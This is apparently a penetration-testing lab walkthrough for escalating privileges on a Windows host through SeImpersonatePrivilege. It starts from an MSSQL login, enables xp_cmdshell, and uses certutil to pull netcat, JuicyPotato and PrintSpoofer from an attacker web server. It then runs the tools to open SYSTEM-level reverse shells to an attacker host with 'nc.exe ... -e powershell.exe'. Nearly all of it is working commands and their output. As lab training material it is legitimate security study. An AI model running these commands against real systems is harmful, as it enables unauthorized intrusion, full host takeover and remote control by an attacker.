# SeImpersonatePrivilege

## Database Connection

```sh
my@attack:~$ mssqlclient.py 'sql_dev':'Str0ng_P@ssw0rd!'@10.129.70.125 -windows-auth
```

## Enable [XP_CMDSHELL](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver17)

```sql
SQL (WINLPE-SRV01\sql_dev  dbo@master)> enable_xp_cmdshell
```

```output title="Output"
INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
```

## Current User

```sql
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell whoami
```

```output title="Output"
output
-----------------------------
nt service\mssql$sqlexpress01

NULL
```

## Current User Privileges

```sql
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell whoami /priv
```

```output title="Output" hl_lines="15 23"
output
--------------------------------------------------------------------------------
NULL

PRIVILEGES INFORMATION

----------------------

NULL

Privilege Name                Description                               State

============================= ========================================= ========

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled

SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled

SeImpersonatePrivilege        Impersonate a client after authentication Enabled

SeCreateGlobalPrivilege       Create global objects                     Enabled

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

NULL
```

## Netcat

```sh
my@attack:~$ nc -lvnp 9001
```

## Web Server

```sh
my@attack:~$ python3 -m http.server 8888
```

## [JuicyPotato](https://github.com/ohpe/juicy-potato)

!!! failure

    * Windows Server 2019
    * Windows 10 build 1809

### Downloading Necessary Files

```sh
my@attack:~$ wget -q 'https://github.com/danielmiessler/SecLists/raw/refs/heads/master/Web-Shells/FuzzDB/nc.exe'
my@attack:~$ wget -q 'https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe'
my@attack:~$ wget -q 'https://raw.githubusercontent.com/ohpe/juicy-potato/refs/heads/master/CLSID/GetCLSID.ps1'
my@attack:~$ wget -q 'https://raw.githubusercontent.com/ohpe/juicy-potato/refs/heads/master/Test/test_clsid.bat'
```

### Uploading Files

```sql
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell certutil.exe -urlcache -split -f "http://10.10.14.164:8888/nc.exe" "C:\Tools\nc.exe"
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell certutil.exe -urlcache -split -f "http://10.10.14.164:8888/JuicyPotato.exe" "C:\Tools\JuicyPotato.exe"
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell certutil.exe -urlcache -split -f "http://10.10.14.164:8888/GetCLSID.ps1" "C:\Tools\GetCLSID.ps1"
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell certutil.exe -urlcache -split -f "http://10.10.14.164:8888/test_clsid.bat" "C:\Tools\test_clsid.bat"
```

### CLSID [Extraction](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)

```sql
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell cd C:\Tools && powershell.exe -ExecutionPolicy Bypass -File .\GetCLSID.ps1
```

```output title="Output" hl_lines="33"
output
--------------------------------------------------------------------------------
NULL

Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation

----           ---------     --------- --------      ----                                               ---------------

HKCR                                   Registry      HKEY_CLASSES_ROOT

Looking for CLSIDs

Looking for APIDs

Joining CLSIDs and APIDs

NULL

PSPath            : Microsoft.PowerShell.Core\FileSystem::C:\Tools\Windows_Server_2016_Standard

PSParentPath      : Microsoft.PowerShell.Core\FileSystem::C:\Tools

PSChildName       : Windows_Server_2016_Standard

PSDrive           : C

PSProvider        : Microsoft.PowerShell.Core\FileSystem

PSIsContainer     : True

Name              : Windows_Server_2016_Standard

FullName          : C:\Tools\Windows_Server_2016_Standard

Parent            : Tools

Exists            : True

Root              : C:\

Extension         :

CreationTime      : 6/18/2025 2:45:11 AM

CreationTimeUtc   : 6/18/2025 9:45:11 AM

LastAccessTime    : 6/18/2025 2:45:11 AM

LastAccessTimeUtc : 6/18/2025 9:45:11 AM

LastWriteTime     : 6/18/2025 2:45:11 AM

LastWriteTimeUtc  : 6/18/2025 9:45:11 AM

Attributes        : Directory

Mode              : d-----

BaseName          : Windows_Server_2016_Standard

Target            : {}

LinkType          :

NULL

NULL

NULL

NULL
```

### CLSID [Test](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)

| CLSID | ACCOUNT |
|---|---|
| [{d20a3293-3341-4ae8-9aaf-8e397cb63c34}](https://github.com/ohpe/juicy-potato/blob/master/CLSID/Windows_Server_2016_Standard/README.md) | NT AUTHORITY\SYSTEM |

```sql
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell move C:\Tools\Windows_Server_2016_Standard\CLSID.list C:\Tools
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell cd C:\Tools && .\test_clsid.bat
```

```output title="Output" hl_lines="19"
output
--------------------------------------------
{D6015EC3-FA16-4813-9CA1-DA204574F5DA} 10000

{c980e4c2-c178-4572-935d-a8a429884806} 10000

{F01D6448-0959-4E38-B6F6-B6643D4558FE} 10001

{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8} 10001

{03ca98d6-ff5d-49b8-abc6-03dd84127020} 10002

{1F3775BA-4FA2-4CA0-825F-5B9EC63C0029} 10003

{69486DD6-C19F-42e8-B508-A53F9F8E67B8} 10004

{FD3659E9-A920-4123-AD64-7FC76C7AACDF} 10004

{d20a3293-3341-4ae8-9aaf-8e397cb63c34} 10004

{42CBFAA7-A4A7-47BB-B422-BD10E9D02700} 10005

{7022a3b3-d004-4f52-af11-e9e987fee25f} 10006

{8B4B437E-4CAB-4e83-89F6-7F9F7DF414EA} 10006

{8C482DCE-2644-4419-AEFF-189219F916B9} 10006

{0A886F29-465A-4aea-8B8E-BE926BFAE83E} 10006

{42C21DF5-FB58-4102-90E9-96A213DC7CE8} 10006

{FFE1E5FE-F1F0-48C8-953E-72BA272F2744} 10007

{C63261E4-6052-41FF-B919-496FECF4C4E5} 10008

{1BE1F766-5536-11D1-B726-00C04FB926AF} 10009

{D3DCB472-7261-43ce-924B-0704BD730D5F} 10010

{145B4335-FE2A-4927-A040-7C35AD3180EF} 10010

{375ff002-dd27-11d9-8f9c-0002b3988e81} 10010

{35b1d3bb-2d4e-4a7c-9af0-f2f677af7c30} 10010

{75BE3767-9BAD-477C-A125-26379D3EDB4A} 10010

{708860E0-F641-4611-8895-7D867DD3675B} 10010

{61738644-F196-11D0-9953-00C04FD919C1} 10010

{A9E69610-B80D-11D0-B9B9-00A0C922E750} 10010

{E0F55444-C140-4EF4-BDA3-621554EDB573} 10011

{08D9DFDF-C6F7-404A-A20F-66EEC0A609CD} 10011

{22f5b1df-7d7a-4d21-97f8-c21aefba859c} 10012

{5BF9AA75-D7FF-4aee-AA2C-96810586456D} 10013

{5C03E1B1-EB13-4DF1-8943-2FE8E7D5F309} 10014

{2DC39BD2-9CFF-405D-A2FE-D246C976278C} 10014

{000C101C-0000-0000-C000-000000000046} 10014

{6FE54E0E-009F-4E3D-A830-EDFA71E1F306} 10014

{A47979D2-C419-11D9-A5B4-001185AD2B89} 10014

{854A20FB-2D44-457D-992F-EF13785D2B51} 10015

{BA677074-762C-444b-94C8-8C83F93F6605} 10015

{581333F6-28DB-41BE-BC7A-FF201F12F3F6} 10015

{F0FF8EBB-F14D-4369-BD2E-D84FBF6122D6} 10016

{14E1D985-892F-4F52-A866-6B1AE6A53DFE} 10016

{555F3418-D99E-4E51-800A-6E89CFD8B1D7} 10016

{B6C292BC-7C88-41EE-8B54-8EC92617E599} 10016

{A1F4E726-8CF1-11D1-BF92-0060081ED811} 10016

{65EE1DBA-8FF4-4a58-AC1C-3470EE2F376A} 10016

{F9A874B6-F8A8-4D73-B5A8-AB610816828B} 10016

{50D185B9-FFF3-4656-92C7-E4018DA4361D} 10016

{4661626C-9F41-40A9-B3F5-5580E80CB347} 10016

{F556F9B2-C810-44A2-BA7A-3AB8C24E666D} 10017

{3c6859ce-230b-48a4-be6c-932c0c202048} 10017

{0fb40f0d-1021-4022-8da0-aab0588dfc8b} 10018

{B91D5831-B1BD-4608-8198-D72E155020F7} 10019

{7D1933CB-86F6-4A98-8628-01BE94C9A575} 10020

{397a2e5f-348c-482d-b9a3-57d383b483cd} 10020

{0B5A2C52-3EB9-470a-96E2-6C6D4570E40F} 10020

{02ECA72E-27DA-40E1-BDB1-4423CE649AD9} 10020

{97061DF1-33AA-4B30-9A92-647546D943F3} 10020

{84C22490-C68A-4492-B3A6-3B7CB17FA122} 10021

{9A3E1311-23F8-42DC-815F-DDBC763D50BB} 10021

{119817C9-666D-4053-AEDA-627D0E25CCEF} 10021

{0E9A7BB5-F699-4D66-8A47-B919F5B6A1DB} 10021

{2781761E-28E2-4109-99FE-B9D127C57AFE} 10021

{8BC3F05E-D86B-11D0-A075-00C04FB68820} 10021

{3185a766-b338-11e4-a71e-12e3f512a338} 10022

{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381} 10022

{30766BD2-EA1C-4F28-BF27-0B44E2F68DB7} 10023

{9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 10023

{0134A8B2-3407-4B45-AD25-E9F7C92A80BC} 10023

{5B3E6773-3A99-4A3D-8096-7765DD11785C} 10024

NULL
```

### Getting Reverse Shell

| CALL | MEANING |
|---|---|
| &#42; | [CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) + [CreateProcessAsUserA](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) |
| t | CreateProcessWithTokenW |
| u | CreateProcessAsUserA |

```sql
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell C:\Tools\JuicyPotato.exe -t * -l 53375 -p "C:\Windows\System32\cmd.exe" -a "/c C:\Tools\nc.exe 10.10.14.164 9001 -e powershell.exe" -c "{d20a3293-3341-4ae8-9aaf-8e397cb63c34}"
```

```output title="Output"
output
----------------------------------------------------------
Testing {d20a3293-3341-4ae8-9aaf-8e397cb63c34} 53375

......

[+] authresult 0

{d20a3293-3341-4ae8-9aaf-8e397cb63c34};NT AUTHORITY\SYSTEM

NULL

[+] CreateProcessWithTokenW OK

[+] calling 0x000000000088ce08

NULL
```

## [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

!!! success

    * Windows Server 2019
    * Windows 10 build 1809

### Downloading Necessary Binaries

```sh
my@attack:~$ wget -q 'https://github.com/danielmiessler/SecLists/raw/refs/heads/master/Web-Shells/FuzzDB/nc.exe'
my@attack:~$ wget -q 'https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe'
```

### Uploading Binaries

```sql
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell certutil.exe -urlcache -split -f "http://10.10.14.164:8888/nc.exe" "C:\Tools\nc.exe"
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell certutil.exe -urlcache -split -f "http://10.10.14.164:8888/PrintSpoofer64.exe" "C:\Tools\PrintSpoofer64.exe"
```

### Reverse Shell

```sql
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell C:\Tools\PrintSpoofer64.exe -c "C:\Tools\nc.exe 10.10.14.164 9001 -e powershell.exe"
```

```output title="Output"
output
-------------------------------------------
[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL
```
